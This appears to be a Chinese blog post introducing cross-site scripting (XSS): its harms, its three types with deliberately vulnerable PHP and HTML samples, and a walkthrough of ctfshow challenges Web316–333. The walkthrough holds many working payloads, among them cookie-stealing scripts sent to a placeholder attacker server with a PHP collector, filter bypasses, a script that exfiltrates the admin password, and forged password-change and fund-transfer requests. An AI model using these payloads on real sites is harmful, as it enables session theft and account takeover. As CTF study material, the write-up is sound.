---
title: xss基础
author: Troy3e
avatar: 'https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/QQ%E5%9B%BE%E7%89%8720210427144151.jpg'
authorAbout: SteamID：888007034
authorDesc: Blizzard：TroyeSivan#51769
categories: 技术
comments: true
date: 2021-10-08 11:42:50
authorLink:
tags:
keywords:
description:
photos: https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/thumb-1920-1180716.jpg
---
#XSS
## 什么是xss？
跨站脚本攻击（Cross Site Scripting），为不和层叠样式表（Cascading Style Sheets，CSS）的缩写混淆，故将跨站脚本攻击缩写为 XSS。恶意攻击者往 WEB 页面里插入恶意 HTML 代码，当用户浏览该页之时，嵌入其中 Web 里面的 HTML 代码会被执行，从而达到恶意攻击用户的特殊目的。

## xss危害
1、通过 document.cookie 盗取 cookie中的信息
2、使用 js或 css破坏页面正常的结构与样式
3、流量劫持（通过访问某段具有 window.location.href 定位到其他页面）
4、dos攻击：利用合理的客户端请求来占用过多的服务器资源，从而使合法用户无法得到服务器响应。并且通过携带过程的 cookie信息可以使服务端返回400开头的状态码，从而拒绝合理的请求服务。
5、利用 iframe、frame、XMLHttpRequest或上述 Flash等方式，以（被攻击）用户的身份执行一些管理动作，或执行一些一般的如发微博、加好友、发私信等操作，并且攻击者还可以利用 iframe，frame进一步的进行 CSRF 攻击。
6、控制企业数据，包括读取、篡改、添加、删除企业敏感数据的能力。

## xss三种分类
搬运自https://ctf-wiki.org/web/xss/

一、反射型 XSS
反射型跨站脚本（Reflected Cross-Site Scripting）是最常见，也是使用最广的一种，可将恶意脚本附加到 URL 地址的参数中。

反射型 XSS 的利用一般是攻击者通过特定手法（如电子邮件），诱使用户去访问一个包含恶意代码的 URL，当受害者点击这些专门设计的链接的时候，恶意代码会直接在受害者主机上的浏览器执行。此类 XSS 通常出现在网站的搜索栏、用户登录口等地方，常用来窃取客户端 Cookies 或进行钓鱼欺骗。

服务器端代码：

	<?php 
	// Is there any input? 
	if( array_key_exists( "name", $_GET ) && $_GET[ 'name' ] != NULL ) { 
    	// Feedback for end user 
    	echo '<pre>Hello ' . $_GET[ 'name' ] . '</pre>'; 
	} 
	?>

可以看到，代码直接引用了 name 参数，并没有做任何的过滤和检查，存在明显的 XSS 漏洞。

二、持久性 XSS
持久型跨站脚本（Persistent Cross-Site Scripting）也等同于存储型跨站脚本（Stored Cross-Site Scripting）。

此类 XSS 不需要用户单击特定 URL 就能执行跨站脚本，攻击者事先将恶意代码上传或储存到漏洞服务器中，只要受害者浏览包含此恶意代码的页面就会执行恶意代码。持久型 XSS 一般出现在网站留言、评论、博客日志等交互处，恶意脚本存储到客户端或者服务端的数据库中。

服务器端代码：

	<?php
  	if( isset( $_POST[ 'btnSign' ] ) ) {
    	// Get input
    	$message = trim( $_POST[ 'mtxMessage' ] );
    	$name    = trim( $_POST[ 'txtName' ] );
    	// Sanitize message input
    	$message = stripslashes( $message );
    	$message = mysql_real_escape_string( $message );
    	// Sanitize name input
    	$name = mysql_real_escape_string( $name );
    	// Update database
    	$query  = "INSERT INTO guestbook ( comment, name ) VALUES ( '$message', '$name' );";
    	$result = mysql_query( $query ) or die( '<pre>' . mysql_error() . '</pre>' );
    	//mysql_close(); }
	?>

代码只对一些空白符、特殊符号、反斜杠进行了删除或转义，没有做 XSS 的过滤和检查，且存储在数据库中，明显存在存储型 XSS 漏洞。

三、DOM XSS
传统的 XSS 漏洞一般出现在服务器端代码中，而 DOM-Based XSS 是基于 DOM 文档对象模型的一种漏洞，所以，受客户端浏览器的脚本代码所影响。客户端 JavaScript 可以访问浏览器的 DOM 文本对象模型，因此能够决定用于加载当前页面的 URL。换句话说，客户端的脚本程序可以通过 DOM 动态地检查和修改页面内容，它不依赖于服务器端的数据，而从客户端获得 DOM 中的数据（如从 URL 中提取数据）并在本地执行。另一方面，浏览器用户可以操纵 DOM 中的一些对象，例如 URL、location 等。用户在客户端输入的数据如果包含了恶意 JavaScript 脚本，而这些脚本没有经过适当的过滤和消毒，那么应用程序就可能受到基于 DOM 的 XSS 攻击。

HTML 代码：

	<html>
  	<head>
    	<title>DOM-XSS test</title>
  	</head>
  	<body>
    	<script>
      	var a=document.URL;
      	document.write(a.substring(a.indexOf("a=")+2,a.length));
    	</script>
  	</body>
	</html>

将代码保存在 domXSS.html 中，浏览器访问：

	http://127.0.0.1/domXSS.html?a=<script>alert('XSS')</script>

即可触发 XSS 漏洞。

##Web316
试了试xss平台，第一题可以打通，第二题就不行了，没有管理员的流量，只有我自己的。所以在vps上自己写一个：

	<?php
	$content = $_GET[1];
	if(isset($content)){
	file_put_contents("flag.txt",$content);
	}else{
	echo"what happened?;
	}
	?>

注意要给权限。
paylaod

	1、
	<script>document.location.href='http://x.x.x.x:5555/xss/xss.php?1='+document.cookie</script>
	2、
	<script>window.open('http://x.x.x.x:5555/xss/xss.php?1='+document.cookie)</script>
	3、
	<script>location.href='http://x.x.x.x:5555/xss/xss.php?1='+document.cookie</script>
	4、
	<script>window.location.href='http://x.x.x.x:5555/xss/xss.php?1='+document.cookie</script>
	5、
	<input onfocus="window.open('http://x.x.x.x:5555/xss/xss.php?1='+document.cookie)" autofocus>
	6、
	<svg onload="window.open('http://x.x.x.x:5555/xss/xss.php?1='+document.cookie)">
	7、<iframe onload="window.open('http://x.x.x.x:5555/xss/xss.php?1='+document.cookie)"></iframe>
	8、<body onload="window.location.href='http://x.x.x.x:5555/xss/xss.php?1='+document.cookie"></body>

##Web317
过滤了script

	<body onload="window.location.href='http://x.x.x.x:5555/xss/xss.php?1='+document.cookie"></body>

##Web318
同317

##Web319
同317

##Web320
过滤空格

	1、用tab代替
	<body	onload="window.location.href='http://x.x.x.x:5555/xss/xss.php?1='+document.cookie"></body>
	2、注释绕过
	<body/**/onload="window.location.href='http://x.x.x.x:5555/xss/xss.php?1='+document.cookie"></body>

##Web321

	<body	onload="window.location.href='http://x.x.x.x:5555/xss/xss.php?1='+document.cookie"></body>

##Web322
理论上上面是可以打通的，但是打了好几遍没打通。原因是我url里面有xss，这里过滤了xss，所以把xss换掉即可。

	<body	onload="window.location.href='http://x.x.x.x:5555/xs/xs.php?1='+document.cookie"></body>

##Web323
同322

##Web324
同322

##Web325
同322

##Web326
同322

##Web327
同322

##Web328

	<script>window.location.href='http://x.x.x.x:5555/xs/xs.php?1='+document.cookie</script>

获得管理员cookie替换即可在用户管理界面看到flag

##Webb29
用上面的payload也能拿到cookie，但是拿到之后就失效了。但是可以写脚本读取页面内容，正好前段时间javaweb接触了点前端的东西：

flag在密码列第一行，查看元素：

![](https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/20211008000223.png)

属于类laytable-cell-1-0-1

	<script>$('.laytable-cell-1-0-1').each(function(index,flag){if(flag.innerHTML.indexOf('ctf'+'show')>-1){window.location.href='http://x.x.x.x:5555/xs/xs.php?1='+flag.innerHTML;}});</script>

ctfshow拆开是防止读到自己。拿到admin密码登录。

##Web330

	<script>window.location.href='http://127.0.0.1/api/change.php?p=111';</script>

改管理员密码
也可以读取页面

![](https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/20211008111805.png)

##Web331

	<script>$.post("http://127.0.0.1/api/change.php",{p:111},"json");</script>

##Web332
逻辑漏洞 转-9999

##Web333

	<script>$.post("http://127.0.0.1/api/amount.php",{'u':'111111' ,'a':10000},"json");</script>

